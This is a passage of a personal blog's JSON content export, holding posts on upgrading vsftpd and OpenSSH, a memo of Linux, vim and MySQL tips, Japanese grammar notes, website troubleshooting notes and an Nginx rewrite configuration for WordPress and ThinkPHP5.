3.0.3","slug":"vsftpd_upgrade_from_2.2.2_to_3.0.3","date":"2019-07-01T07:33:24.000Z","updated":"2021-04-02T02:27:05.979Z","comments":true,"path":"2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/","link":"","permalink":"https://tari.moe/2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/","excerpt":"","text":"记一次vsftpd 升级过程备份(快照)收集系统信息以及原有vsftpd安装版本信息123uname -arpm -qa | grep vsftpdvsftpd -v 卸载原 vsftpd1rpm -e vsftpd-****** GPG签名认证由于没用到公钥,因此跳过下面两条命令 12gpg -import publickeygpg -verify ***.asc(.sig) *** 解压后进行库文件相关设置安装之前,如果系统为64位，需要更改vsf_findlibs.sh文件库中lib 路径改为lib64 1sed -i &#x27;s/lib\\//lib64\\//g&#x27; vsf_findlibs.sh 编译安装由于没有相关依赖,因此不用进行预编译 1make &amp;&amp; make install 配置信息修改因为是升级安装，需要保留原来vsftp的相关配置，接下来需要复制些文件到相应vsftp目录。具体操作如下： 12cp vsftpd.conf /etc #配置主文件 cp RedHat/vsftpd.pam /etc/pam.d/ftp #PAM 认证文件 如果系统为64位，请将/etc/pam.d/ftp /lib目录替换为/lib64 1sed -i &#x27;s/lib\\//lib64\\//g&#x27; /etc/pam.d/ftp 将以下内容写入 /etc/vsftpd.conf 123anonymous_enable=NOlocal_enable=yeswrite_enable=YES 启动 vsftpd 进行测试1vsftpd /etc/vsftpd.conf &amp; 把 vsftpd 加入到开机启动项中将以下内容写入 /etc/rc.d/rc.local_enable 1vsftpd /etc/vsftpd.conf 修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建创建 /usr/share/empty 文件夹并将以下内容写入 /etc/vsftpd.conf 1secure_chroot_dir=/usr/share/empty 注意：如重启后不能启动服务修改 /etc/xinetd.d/vsftpd 文件，把 disable=no 改成 disable=yes 就行了 版本验证1vsftpd -v 参考自: https://blog.csdn.net/dbdeep/article/details/63037691","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"vsftpd","slug":"运维/vsftpd","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/vsftpd/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"vsftpd","slug":"vsftpd","permalink":"https://tari.moe/tags/vsftpd/"}]},{"title":"Openssh upgrade, from 7.5 to 8.0p1","slug":"Openssh_upgrade_from_7.5_to_8.0p1","date":"2019-06-30T16:20:55.000Z","updated":"2021-04-02T02:17:28.356Z","comments":true,"path":"2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/","link":"","permalink":"https://tari.moe/2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/","excerpt":"","text":"记一次OpenSSH升级过程系统环境: Ubuntu14.04sshd -D先是修改sshd配置允许root登录，但是重启不了 1sudo service ssh restart 查看得知存在 sshd -D 进程并终止它 12ps -ef | grep sshsudo kill ID 最后开启sshd 1sudo /usr/sbin/sshd -D 启动后就可以root登录了emmm…. 好像启动后只能登录一次?那请试试: 1sudo /usr/sbin/sshd -t 好奇的我想知道-D是什么意思…但看了说明也不知道为什么系列。。-D When this option is specified, sshd will not detach and does not become a daemon. This allows easy monitoring of sshd. 会不会和这有关呢? (摘自官网)OpenSSH runs as two processes when connecting to other computers. The first process is a privileged process and controls the issuance of privileges as necessary. The second process communicates with the network. 快照别忘了备份、别忘了备份、别忘了备份… 卸载原本OpenSSH由于我原本是编译安装的，到原本编译安装的目录卸载就可以了 1make uninstall 下载OpenSSH到官网下载就可以了http://www.openssh.com/releasenotes.html SHA1值检验1sha1sum openssh-8.0p1.tar.gz 相关依赖包pam pam-devel zlib zlib-devel openssl-devel 注意下ubuntu下pam是 libpam0g、pam-devel 是 libpam0g-dev编译安装1./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-pam --with-zlib --with-ssl-dir=/usr/local/ssl --with-privsep-path=/var/lib/sshd 1make &amp;&amp; make install 重启服务器，搞定！","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"memo","slug":"memo","date":"2019-06-29T16:17:36.000Z","updated":"2021-04-02T02:17:01.656Z","comments":true,"path":"2019/06/30/memo/","link":"","permalink":"https://tari.moe/2019/06/30/memo/","excerpt":"","text":"记录 linux 一些常见问题一、某端口是否被 Linux 防火墙阻止-L: 查看管理命令子命令:&emsp;-n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。&emsp;-v：显示详细信息 1iptables -vnL | grep &#x27;:port&#x27; 二、^字符对上一个命令的文本替换并重新执行命令^before^after^ 三、vim系列 vim 字符串替换 12345678910111213141516171819:s/well/good/ 替换当前行第一个well 为 good:s/well/good/g 替换当前行所有well 为 good:n,$s/well/good/ 替换第 n 行开始到最后一行中每一行的第一个 well 为 good:n,$s/well/good/g 替换第 n 行开始到最后一行中每一行所有 well 为 goodn 为数字，若 n 为 .，表示从当前行开始到最后一行:%s/well/good/ （等同于 :g/well/s//good/） 替换每一行的第一个 well 为 good:%s/well/good/g （等同于 :g/well/s//good/g） 替换每一行中所有 well 为 good特殊符号转义：可以使用#作为分隔符，此时中间出现的 / 不会作为分隔符:s#well/#good/# 替换当前行第一个 well/ 为 good/:%s#/usr/bin#/bin#g 可以把文件中所有路径/usr/bin换成/bin vim 乱码问题其中-b一般是用来查看对应的二进制文件 1vim -b file vim tab 设置为4个空格vimrc文件末尾加上 123set ts=4set expandtabset autoindent vim 多行注释 首先按 esc 进入命令行模式下，按下 Ctrl + v，进入列（也叫区块）模式; 在行首使用上下键选择需要注释的多行; 按下键盘（大写）“I” 键，进入插入模式； 然后输入注释符（“//”、“#”等）; 最后按下 “Esc” 键。 注：在按下esc键后，会稍等一会才会出现注释，不要着急时间很短的~ vim 去掉高亮底色进入命令模式, 输入 1:nohl vim 除了 i o 外的其他插入 I 在光标当前行开始插入 a 在光标后插入 A 在光标当前行末尾插入 O 在光标当前行的上一行插入新行 vim 定位命令 :set nu 显示行号 :set nonu 取消行号 vim 替换和取消命令 r 替换光标所在处的字符 R 从光标所在处开始替换,按Esc键结束 vim 删除命令(一直傻傻的按远远的del键..) x 删除光标所在处命令 nx 删除光标所在处后的n个字符 dG 删除光标所在行到末尾行的所有内容 D 删除光标所在处到行尾的内容 :n,md 删除制定范围的行 vim 常用快捷键 Shift + zz 保存退出, 与 “:wq” 作用相同 V 进入行可视模式 Ctrl + v 进入块可视模式 vim 鼠标右键不能复制粘贴，而是切为可视化模式 全局改变 vim /etc/vimrc 仅改变当前用户 vim ~/.vimrc 注意事项: source 这一行的功能是加载默认配置，一定要先确定该文件路径存在 (根据vim版本确实vim7*,8*)，否则可能会导致 vim 不可用12345source /usr/share/vim/vim81/defaults.vimlet skip_defaults_vim = 1if has(&#x27;mouse&#x27;) set mouse-=aendif 重新打开 vim 就可以正常使用鼠标右键复制粘贴了 转载自: https://xirikm.net/2019/504-1.html 八、linux终端锁屏与解锁ctrl+s 锁屏ctrl+q 解锁 九、Sublime Text 3 垂直选取Shift+鼠标右键 十、MySQL统计所以库数据大小（有点慢喔）12345SELECT TABLE_SCHEMA, concat(TRUNCATE(sum(data_length)/1024/1024,2),&#x27;MB&#x27;) AS data_size,concat(TRUNCATE(sum(index_length)/1024/1024,2),&#x27;MB&#x27;) AS index_sizeFROM information_schema.TABLESGROUP BY TABLE_SCHEMAORDER BY data_length DESC; 十一、用户加组1usermod -aG group user 十二、探测服务是否已经启动, 运行是否正常1killall -0 service 十三、deb 和 rpm 包之间的转换1sudo apt install alien 十四、查看自己的 pts1who am i 十五、创建目录结构12# -v 显示做了什么mkdir -pv path/&#123;dir1, dir2, ...&#125; 十六、查看 nginx 的组和用户并锁定其不能用 ssh 登录12345678# 查看组getent group nginx# 查看用户getent passwd nginx# 查看nginx属于哪个组id nginx# 锁定 nginx 不能登录usermod -s /sbin/nologin nginx 十七、锁定nginx用户不能登录1passwd -l 十八、mysql密码强度设置1234mysql&gt; set global validate_password_policy=0;mysql&gt; set global validate_password_length=1;# 设置 root&#x27;@&#x27;localhost 的密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;; 十九、MySQL查看所有连接的客户端ip1234567891011SELECT user, host from mysql.user;# 或者SELECT substring_index(HOST, &#x27;:&#x27;, 1) AS host_name, state, count(*)FROM information_schema. PROCESSLISTGROUP BY state, host_name; 二十、编码转换1234# 在 linux 下打开 windows 的 txt 可能乱码iconv -f GBK -t UTF-8 文件名字# gedit 乱码可尝试gsettings set org.gnome.gedit.preferences.encodings candidate-encodings &quot;[&#x27;GB18030&#x27;, &#x27;UTF-8&#x27;, &#x27;CURRENT&#x27;, &#x27;ISO-8859-15&#x27;, &#x27;UTF-16&#x27;]&quot; 二十一、批量图片大小转换1find ./ -name &#x27;*.jpg&#x27; -exec convert -resize 1100x2200 &#123;&#125; &#123;&#125; \\; 二十一、五 弄一个读取速度很快很快的小硬盘12mkdir -p /mnt/rammount -t tmpfs tmpfs /mnt/ram -o size=8192M 二十二、don’t add command to history (note the leading space)1echo &quot;Am I like a hacker?&quot; 二十三、exit terminal but leave all processes running1disown -a &amp;&amp; exit 二十四、script 回放1234# 开始录像，ctrl+d或者exit结束script -t 2&gt;demo.time -a demo.his# 回放scriptreplay demo.time demo.his 二十五、 搜索历史记录ctrl + r我天，这么好用的命令我居然一直很少用。。。 二十六、 V2ray1234567# 系统时间sudo date -s 2019/10/27 sudo date -s 16:36:10# 或sudo pacman -S openntpdsudo systemctl enable openntpdsudo systemctl start openntpd 二十七、archlinux vmware12# 每次更新完内核都要使用如下命令重新编译内核模块的sudo vmware-modconfig --console --install-all 二十八、linux写入 ntfs 文件需要安装 ntfs-3g 二十九、sudo git 导致root用户和其他用户git配置不一致sudo 也不是乱用的晕。。。 1234567891011*** Please tell me who you are.Run git config --global user.email &quot;you@example.com&quot; git config --global user.name &quot;Your Name&quot;to set your account&#39;s default identity.Omit --global to set the identity only in this repository.fatal: unable to auto-detect email address (got &#39;root@****.(none)&#39;) 三十、 archlinux 中一个网卡多ip可能会导致不同服务ip冲突导致网速下降123456789# 查看一个网卡是否存在多个ipip addr# 如果存在多个 ip 可能是系统装有多个网络管理造成的, 我是把 dhcpcd 关了 再 配合静态ip就好了systemctl stop dhcpcdsystemctl disable dhcpcd# 然后重启shutdown -r now 三十一、 linux 下 pycharm 用 matplotlib 库中文乱码 及 减号方块问题123# 查看 matplotlib 字体及配置文件目录import matplotlib CONFIG_DIR = print(matplotlib.matplotlib_fname()) 1234567891011121314# https://fontzone.net/download/simhei 下载 simhei 字体# 把字体拷贝到 matplotlib 字体目录# 要注意你新下载字体的用户及用户组的权限和该目录下一致cp DOWNLOAD_DIR/simhei.ttf CONFIG_DIR/fonts/ttf/ vim CONFIG_DIR/matplotlibrc # matplotlib 配置文件目录# 找到相应位置并 修改为下面三项font.family : sans-seriffont.sans-serif : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serifaxes.unicode_minus:False #作用就是解决负号&#x27;-&#x27;显示为方块的问题# 删除原本字体缓存cd ~/.cache/matplotlibrm -rf *.* 12345678# coding: utf-8import matplotlib.pyplot as pltplt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;SimHei&#x27;]mpl.rcParams[&#x27;axes.unicode_minus&#x27;] = False# 应该就 OK 了","categories":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"「助詞」","slug":"「助詞」","date":"2019-06-29T08:42:22.000Z","updated":"2021-04-02T02:13:34.661Z","comments":true,"path":"2019/06/29/「助詞」/","link":"","permalink":"https://tari.moe/2019/06/29/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/","excerpt":"","text":"助詞「は」l— 主語は 一个句子只能有一个l— 表示区别对比例：明日は働きません 私は野菜と魚を食べます。肉は食べません [私は]土曜日は友達と食事します。日曜日は働きます 助詞「に」l— 表示動作進行時点 具体时间要放「に」（八時に、午後四時に）〜 ます例：１０時に友達と食事します。 泛指时间不用放「に」（明日）〜 ます 可放可不放「に」月曜日 火曜日 水曜日 木曜日 金曜日 土曜日 日曜日 l— 表示存在位置 重点是 东西或人/动物 存在位置 + に + 东西 + が あります例：机の上にリンゴがあります a：京都に何があります b：古いお寺や神社[など]が あります 存在位置 + に + 人/动物 + が います例：あそこに子供がいます a：部屋に誰がいます b：田中さんがいます 重点是 位置 东西 + は + 存在位置 + に + が あります例：a：トイレはどこにありますか&emsp;&emsp;b：2階にあります/2階です 人/动物 + は + 存在位置 + に + が います例：a：田中さんはどこにいますか&emsp;&emsp;b：＿＿＿＿＿会議室にいます l— 当动作一个人完成不了时动作主 + は + 动作对方 + に +动作对象 + を + 动词例：私は友達に電話を掛けました&emsp;&emsp;[私は]友達にCDを貸しました&emsp;&emsp;私はFAXで会社にレポートを送りました 例：私は母にカードをあげました&emsp;&emsp;私は母にセーターを貰いました 收到&emsp;&emsp;母は私にセーターをくれました 给(我)&emsp;&emsp;× 母は私にセーターをあげました&emsp;&emsp;因为日本人比较谦虚, 给别人的时候要 「上げ」, 就是比较熟的人也是如此, 别人给我时是 「クレ」&emsp;&emsp;例：友達は私の妹に本をくれました&emsp;&emsp;&emsp;&emsp;私は父にネクタイをあげました l— 表示分配時間期間 + に + 次数 例：一週間に２回日本語を勉強しますa：一周間に何回英語を勉強しますかb：4回勉強します。1回に4時間勉強しますa：じゃあ、一週間に１６時間ですね。すごいですね 助詞「で」l— 表示動作進行地点 場所 + で + 動詞 〜 ます在…例：駅の前で会いましょう。 一个人做什么什么一人で 表示交通工具（搭乘～，开～，骑～， 坐～）例：電車で行きます 要搭电车去 l— 用…工具(方法)例：私はFAXで会社にレポートを送りました 助詞「と」l— 和（跟）…例：日曜日、[あなたは]誰と食事しますか。 [私は]高校時代の友達と食事します。 l— 表并列 和 机の上に本とノートがあります 表示桌子上只有书和备忘录 机の上に本やノート[など(等)]があります 表示桌子上有书、备忘录等 助詞「を」 表示动作作用对象(看得见的动作) 対象 + を + 動作例：日本語を勉強します 助詞「が」 対象 + が（表示焦点）+ 状態動詞 例：日本語が分かります&emsp;&emsp;私はお金が全然ありません 時制 - 肯定 否定 現在 〜ます 〜ません 過去 〜ました 〜ませんでした 語気 ませんか要不要 例：一緒に[動詞]ませんか&emsp;&emsp;ええ、[ ]ましょう&emsp;&emsp;すみません、ちょっと… その他 歩いて走路去 总是 いつも 经常 よく 有时候 時々 不常 あまり＿＿ません 完全不 全然＿＿ません 理由原因から、＿＿＿＿＿＿例：お金がありませんから、どこも行きたくないです&emsp;&emsp;日本のアニメが好きですから、日本語を勉強します&emsp;&emsp;a：どうして、昨日、学校へ来ませんですか&emsp;&emsp;b：疲れましたから もう 已经例：もう晩ご飯を食べましたか&emsp;&emsp;はい、もう食べました&emsp;&emsp;いいえ、まだです&emsp;&emsp;20時ですね、もう帰ります&emsp;&emsp;a：もうあの映画を見ましたか&emsp;&emsp;b：いいえ、まだです。明日友達と見ます&emsp;&emsp;a：21時ですよ、帰りませんか&emsp;&emsp;b：そうですね、帰りましょう","categories":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"some issue","slug":"some_issue","date":"2019-06-27T07:53:50.000Z","updated":"2021-04-02T02:18:10.721Z","comments":true,"path":"2019/06/27/some_issue/","link":"","permalink":"https://tari.moe/2019/06/27/some_issue/","excerpt":"","text":"官网访问相关检查内外网, vpn情况下的访问情况, 以此来粗略判断是否为waf拦截[案例1]: 官网外网无法访问, 内网可以或vpn可以, 说明网站没有问题, 可以推测下是waf拦截 检查118 119 120的通信情况(ping)[案例2]: 访问网站出现500错误, 通过ping发现120无法通信，也进不了shell， 登陆vsphere发现是集群的共享存储满了 检查 内存, cpu使用情况(top)[案例3]: 官网主页上不去, 登陆118后发现有个程序跑满了cpu, 使用kill命令杀掉相关进程(kill前先确认下进程用途) 检查nginx,php-fpm的运行情况(ps -aux| grep xxx)检查 硬盘使用情况 (df -h或vshpere)查看 nginx, php日志文件尝试对nginx ,php-fpm重启尝试对服务器重启如果xshell 无法连接服务器, 登陆vsphere 检查服务器储存空间是否已满 挂载相关官网上传文件失败, 图片不显示, /wp-content/uploads/无法建立目录等与挂载文件夹(一般是uploads文件夹)下的文件相关的问题检查119的文件挂载是否成功(showmount -e)若没挂载成功, 重启服务器如果要对/wp-content/uploads/的文件进行权限相关的操作,需要在119上进行处理, 118上无法进行 恢复快照相关刚刚快照恢复后, 可能会遇见网站部分功能失效,部分页面无法访问, 可能是文件挂载或数据库连接没有完全恢复, 建议等待30min~1h后再查看网站是否正常, 再进行下一步操作排查问题. 快照恢复和重启对官网访问会造成一定影响, 涉及到这类的操作做好晚上进行","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Openssh upgrade, from 7.5 to 7.9","slug":"Openssh upgrade, from 7.5 to 7.9","date":"2019-06-24T02:54:44.000Z","updated":"2021-04-02T02:17:25.615Z","comments":true,"path":"2019/06/24/Openssh upgrade, from 7.5 to 7.9/","link":"","permalink":"https://tari.moe/2019/06/24/Openssh%20upgrade,%20from%207.5%20to%207.9/","excerpt":"","text":"记一次OpenSSH升级过程系统环境: Ubuntu14.04 如果服务器并非采用云虚拟平台，最好先启用并测试SSH以外的连接方式（如Telnet）是否能够正常使用，如果SSH安装失败会连不上服务器（别问我怎么知道的…） 删除旧版本的openssh版本文件及旧版本的openssl（1、记得先备份好 2、如果zlib版本适应当前版本OpenSSH，可以不用更新） Wget openssh7.9p1、openssl1.1.1 和 perl5.26安装包 先编译安装perl,记得备份旧的perl，再创造新的软链接Perl -v进行测试 编译安装openssl，openssl version测试不成功到bin目录下./openssl version，报文件加载出错备份并重新创建新的libssl.so.1.1和libcrypto.so.1.1软链接再次bin目录下./openssl version成功备份并创建新的openssl软链接Openssl version进行测试 编译安装openssh 修改ssh配置文件允许root用户登录","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"ゴーストルール","slug":"ゴーストルール","date":"2019-06-24T02:33:33.000Z","updated":"2021-04-02T02:19:36.940Z","comments":true,"path":"2019/06/24/ゴーストルール/","link":"","permalink":"https://tari.moe/2019/06/24/%E3%82%B4%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/","excerpt":"","text":"‘メーデー’の意味この前、ゴーストルールを聴きました、その歌詞の中 ’メーデー’ がありますどういう意味なのか？ その意味について考えがあります。 グーグルで、このような言葉がある：Mayday is an emergency procedure word used internationally as a distress signal in voice-procedure radio communications. 遭難信号のことですか？エエエエエ、、全然分からない 最後にこのリンクを見つけました ゴーストルール歌詞の意味つまり、主人公は遭難していて、だれかに見つけてもらいたいと信号を送っているのです。 そんな遭難信号を送っておきながら、僕は見つけられても抱き締めなくていいと言っています。 一方で、僕に気づいたら笑いかけて欲しいと願っています。 これは、僕が抱きしめることのできない存在だということを言っているのではないでしょうか？","categories":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"Deploy WordPress, ThinkPHP5 and general system in Nginx","slug":"maintence","date":"2019-06-23T16:01:51.000Z","updated":"2021-04-02T02:28:01.006Z","comments":true,"path":"2019/06/24/maintence/","link":"","permalink":"https://tari.moe/2019/06/24/maintence/","excerpt":"","text":"记一次Nginx上同时部署WordPress、 ThinkPHP5 和 普通系统，其中WordPress使用目录多站点这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。 wordpress本身路由特点，wordpress在建站时会把网站的根地址存在数据库的wp_options表的siteurl、home、ossdl_off_cdn_url和ossdl_off_blog_url字段中，路由都是从数据库中读取。所以nginx无论怎么修改配置都是测试不了问题的。 wordpress域名多站点与目录多站点存在着不同之处，安装wp目录多站点时，必须要停用所有插件再开启。 wp目录多站点的重写规则，由于wp路由的特殊性，wp在nginx的配置会覆盖其他系统的配置，所以访问uri时必须首先重写其他系统的uri。又由于存在wp，tp5，以及原生系统，三种不同路由的规则，一开始服务器配置又经过许多人手，配置起来比较凌乱。 由于在编译安装nginx时，没有装上echo输出，在我们调试正则表达式规则重写uri时候带来了很多麻烦，需要改不同的正则表达式，然后查看log文件，站点访问情况等摸索它的重写规律。 以下是配置文件内容:RoomReserver 是普通系统，tpmas是ThinkPHP5系统12345678910111213141516171819202122232425#RoomResever rewrite rulerewrite ^&#x2F;RoomReserve&#x2F;(.*)$ &#x2F;RoomReserve&#x2F;$1 break;#tpmas rewrite ruleif ( $request_uri ~* &#x2F;tpmas&#x2F; ) &#123; rewrite ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last; break; #rewrite ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last; break;&#125;#wordpress rewrite rulerewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?wp-admin$ &#x2F;$1wp-admin&#x2F; permanent;if (-f $request_filename)&#123;set $rule_2 1;&#125;if (-d $request_filename)&#123;set $rule_2 1;&#125;if ($rule_2 &#x3D; &quot;1&quot;)&#123;#ignored: “-” thing used or unknown variable in regex&#x2F;rew&#125;rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(wp-(content|admin|includes).*) &#x2F;$2 last;rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(.*.php)$ &#x2F;$2 last;rewrite &#x2F;. &#x2F;index.php last;","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"运维/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-06-22T16:23:37.000Z","updated":"2021-04-01T08:25:34.475Z","comments":true,"path":"2019/06/23/hello-world/","link":"","permalink":"https://tari.moe/2019/06/23/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"比赛","slug":"ctf/比赛","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"},{"name":"hackme","slug":"ctf/hackme","permalink":"https://tari.moe/categories/ctf/hackme/"},{"name":"ctf练习","slug":"ctf/hackme/ctf练习","permalink":"https://tari.moe/categories/ctf/hackme/ctf%E7%BB%83%E4%B9%A0/"},{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/categories/SDL/"},{"name":"威胁建模","slug":"SDL/威胁建模","permalink":"https://tari.moe/categories/SDL/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"},{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"流量分析/Wireshark","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/"},{"name":"MISC","slug":"流量分析/Wireshark/MISC","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/MISC/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"小记","slug":"总结/小记","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"},{"name":"开发","slug":"开发","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"开发/Python","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/"},{"name":"Django","slug":"开发/Python/Django","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/Django/"},{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"},{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"},{"name":"入门","slug":"ctf/入门","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"},{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"运维/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"},{"name":"Wordpress","slug":"开发/Wordpress","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Wordpress/"},{"name":"Nginx","slug":"运维/Nginx","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Nginx/"},{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"},{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"日常折腾/Motrix","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/"},{"name":"aria2","slug":"日常折腾/Motrix/aria2","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/aria2/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"},{"name":"vsftpd","slug":"运维/vsftpd","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/vsftpd/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"比赛","slug":"比赛","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"},{"name":"hackme","slug":"hackme","permalink":"https://tari.moe/tags/hackme/"},{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/tags/SDL/"},{"name":"威胁建模","slug":"威胁建模","permalink":"https://tari.moe/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"},{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://tari.moe/tags/Wireshark/"},{"name":"MISC","slug":"MISC","permalink":"https://tari.moe/tags/MISC/"},{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"},{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"Python","permalink":"https://tari.moe/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://tari.moe/tags/Django/"},{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/tags/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"},{"name":"入门","slug":"入门","permalink":"https://tari.moe/tags/%E5%85%A5%E9%97%A8/"},{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"},{"name":"Nginx","slug":"Nginx","permalink":"https://tari.moe/tags/Nginx/"},{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"},{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/tags/%E6%97%A5%E5%B8%B8%E6%8A%9